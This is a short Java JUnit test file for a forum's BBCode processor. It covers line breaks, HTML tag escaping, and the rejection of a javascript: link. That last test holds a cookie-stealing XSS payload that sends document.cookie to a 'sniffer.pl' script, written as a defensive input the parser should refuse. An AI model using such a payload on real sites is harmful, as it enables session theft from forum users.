package org.javabb.bbcode;

import static org.junit.Assert.assertEquals;
import org.junit.Test;

import ru.org.linux.util.BadURLException;

public class BBCodeTest {
  private static final String LINE_BREAK_TEST = "test\ntest\n\ntest";
  private static final String LINE_BREAK_RESULT = "test\ntest<br>test";
  
  private static final String TAG_ESCAPE_TEST = "<br>";
  private static final String TAG_ESCAPE_RESULT = "&lt;br&gt;";

  @Test
  public void testLineBreak() throws BadURLException {
    BBCodeProcessor proc = new BBCodeProcessor();

    String result = proc.preparePostText(LINE_BREAK_TEST);

    assertEquals(LINE_BREAK_RESULT, result);
  }

  @Test
  public void testTagExcape() throws BadURLException {
    BBCodeProcessor proc = new BBCodeProcessor();

    String result = proc.preparePostText(TAG_ESCAPE_TEST);

    assertEquals(TAG_ESCAPE_RESULT, result);
  }

  @Test(expected=BadURLException.class)
  public void testJavascriptURL() throws BadURLException {
    BBCodeProcessor proc = new BBCodeProcessor();

    proc.preparePostText("[url=javascript:var c=new Image();c.src=\"http://127.0.0.1/sniffer.pl?\"+document.cookie;close()]Test[/url]");
  }
}